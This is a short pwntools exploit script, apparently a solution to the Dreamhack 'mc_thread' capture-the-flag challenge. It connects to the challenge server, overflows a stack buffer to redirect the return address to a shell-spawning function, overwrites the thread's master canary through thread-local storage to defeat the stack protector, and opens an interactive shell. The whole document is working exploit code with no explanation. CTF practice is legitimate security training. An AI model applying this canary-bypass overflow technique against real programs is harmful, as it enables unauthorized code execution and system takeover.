#!/usr/bin/env python3

from pwn import *
exe = ELF('mc_thread_patched', checksec = False)
libc = ELF('libc.so.6', checksec = False)

# p = process(exe.path)
p = remote('host3.dreamhack.games', 21002)

# input()
giveshell = 0x401256

payload = b'A'*0x110 + b'A'*8 # buf + DUMMY + SFP
payload += p64(giveshell) # RET
payload += b'A'*(0x7f0)
payload += p64(0x4040a0) # valid address for fs:0x10 + 0x972
payload += b'A'*0x10 # DUMMY
payload += b'A'*8 # Master Canary

p.sendlineafter(b"Size: ", b'297')
p.sendafter(b"Data: ", payload)


p.interactive()
